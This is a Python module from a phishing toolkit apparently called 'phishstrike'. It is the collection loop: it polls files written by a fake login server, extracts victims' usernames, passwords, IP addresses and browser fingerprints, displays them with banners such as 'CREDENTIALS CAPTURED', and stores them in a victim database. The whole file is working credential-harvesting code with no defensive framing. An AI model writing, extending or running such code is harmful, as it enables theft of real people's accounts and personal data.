import os
import time

import json
from phishstrike.core import database
from phishstrike.lib.dashboard_client import notify_dashboard_refresh
from phishstrike.lib.terminal_ui import *
from phishstrike import state


def _read_and_remove(filepath: str):
    """Safely read and remove a file (avoids TOCTOU race)."""
    try:
        with open(filepath, "r") as f:
            content = f.read()
        try:
            os.remove(filepath)
        except OSError:
            pass
        return content
    except (OSError, IOError):
        return ""


def capture_ip(silent: bool = False, content: str | None = None) -> None:
    if content is None:
        ip_file = os.path.join(state.BASE_DIR, ".server/www/ip.txt")
        content = _read_and_remove(ip_file)
    if not content:
        return

    lines = content.splitlines()
    ip = ""
    for line in lines:
        if "IP: " in line:
            ip = line.split("IP: ", 1)[1].strip()

    if not silent:
        slow_type(
            "\n    [+] CONNECTION: VICTIM IP TRACKED !!",
            speed=0.01,
            start_rgb=RGB_PURPLE,
            end_rgb=RGB_CYAN,
        )
        print(
            f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        print(f"    {LIGHT2}Victim IP : {WHITE}{ip}")
        print(f"    {LIGHT2}Log File  : {LIGHT1}auth/ip.txt")
        print(
            f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    auth_dir = os.path.join(state.BASE_DIR, "auth")
    os.makedirs(auth_dir, exist_ok=True)
    auth_ip_file = os.path.join(auth_dir, "ip.txt")
    try:
        with open(auth_ip_file, "a") as f:
            f.write(content)
    except OSError:
        pass

    print("\r\033[K", end="")
    print(
        f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
    )
    slow_type(
        f"    [+] INFILTRATION DETECTED: {ip}",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_PURPLE,
    )
    print(
        f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
    )

    if silent:
        print(
            f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
            end="",
            flush=True,
        )

    database.add_victim(state.website, "IP_ONLY", "N/A", ip)
    notify_dashboard_refresh()


def capture_fingerprint(silent: bool = False, content: str | None = None) -> None:
    if content is None:
        fingerprint_file = os.path.join(state.BASE_DIR, ".server/www/fingerprint.txt")
        content = _read_and_remove(fingerprint_file)
    if not content:
        return

    for line in content.splitlines():
        try:
            data = json.loads(line)
            database.add_fingerprint(
                data.get("os", "Unknown"),
                data.get("browser", "Unknown"),
                data.get("screen_width", 0),
                data.get("screen_height", 0),
                data.get("language", "Unknown"),
                data.get("time_zone", "Unknown"),
                data.get("ip", "Unknown")
            )
            
            if not silent:
                slow_type(
                    "\n    [+] DEVICE PROFILED: FINGERPRINT SECURED !!",
                    speed=0.01,
                    start_rgb=RGB_BLUE,
                    end_rgb=RGB_CYAN,
                )
        except json.JSONDecodeError:
            continue
            
    notify_dashboard_refresh()


def capture_creds(silent: bool = False, content: str | None = None) -> None:
    if content is None:
        user_file = os.path.join(state.BASE_DIR, ".server/www/usernames.txt")
        content = _read_and_remove(user_file)
    if not content:
        return

    lines = content.splitlines()
    account = ""
    password = ""
    for line in lines:
        if "Username:" in line:
            after_user = line.split("Username:", 1)[1].strip()
            if "Pass:" in after_user:
                account = after_user.split("Pass:", 1)[0].strip()
            else:
                account = after_user
        if "Pass:" in line:
            password = line.split("Pass:", 1)[-1].strip()

    ip = "Unknown"
    auth_ip_file = os.path.join(state.BASE_DIR, "auth/ip.txt")
    if os.path.exists(auth_ip_file):
        with open(auth_ip_file, "r") as f:
            last_lines = f.readlines()[-5:]
            for line in last_lines:
                if "IP: " in line:
                    ip = line.split("IP: ")[1].strip()

    if not silent:
        slow_type(
            "\n    [!] SUCCESS: CREDENTIALS CAPTURED !!",
            speed=0.02,
            start_rgb=RGB_PINK,
            end_rgb=RGB_CYAN,
        )
        print(
            f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        print(f"    {LIGHT2}Account  : {WHITE}{account}")
        print(f"    {LIGHT2}Password : {WHITE}{password}")
        print(f"    {LIGHT2}IP Addr  : {WHITE}{ip}")
        print(
            f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    auth_dir = os.path.join(state.BASE_DIR, "auth")
    os.makedirs(auth_dir, exist_ok=True)
    auth_creds_file = os.path.join(auth_dir, "usernames.dat")
    with open(auth_creds_file, "a") as f:
        f.writelines(lines)

    print("\r\033[K", end="")
    print(
        f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PINK, RGB_CYAN)}"
    )
    slow_type(
        f"    [!] INTEL SECURED: {account} | {password}",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_PINK,
    )
    print(
        f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PINK)}"
    )

    if silent:
        print(
            f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
            end="",
            flush=True,
        )

    database.add_victim(state.website, account, password, ip)
    notify_dashboard_refresh()


def capture_data(silent: bool = False) -> None:
    state.stop_monitoring.clear()
    www_dir = os.path.join(state.BASE_DIR, ".server/www")

    if not silent:
        wait_msg = "    [*] Waiting for Login Info... [ Ctrl + C to exit ]"
        print("\n" + gradient_text(wait_msg, RGB_BLUE, RGB_WHITE))
    try:
        while not state.stop_monitoring.is_set():
            ip_file = os.path.join(www_dir, "ip.txt")
            user_file = os.path.join(www_dir, "usernames.txt")
            fingerprint_file = os.path.join(www_dir, "fingerprint.txt")

            ip_content = _read_and_remove(ip_file)
            if ip_content:
                current_ip = ""
                for line in ip_content.splitlines():
                    if "IP: " in line:
                        current_ip = line.split("IP: ", 1)[1].strip()
                if current_ip and current_ip != state.last_captured_ip:
                    state.last_captured_ip = current_ip
                    capture_ip(silent=silent, content=ip_content)

            if state.stop_monitoring.is_set():
                break

            user_content = _read_and_remove(user_file)
            if user_content:
                if not silent:
                    print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Login info Found !!")
                capture_creds(silent=silent, content=user_content)

            if state.stop_monitoring.is_set():
                break

            fp_content = _read_and_remove(fingerprint_file)
            if fp_content:
                capture_fingerprint(silent=silent, content=fp_content)

            if state.stop_monitoring.is_set():
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n\n    {DARK}[{WHITE}-{DARK}]{LIGHT1} Stopping monitoring...")
        time.sleep(1)
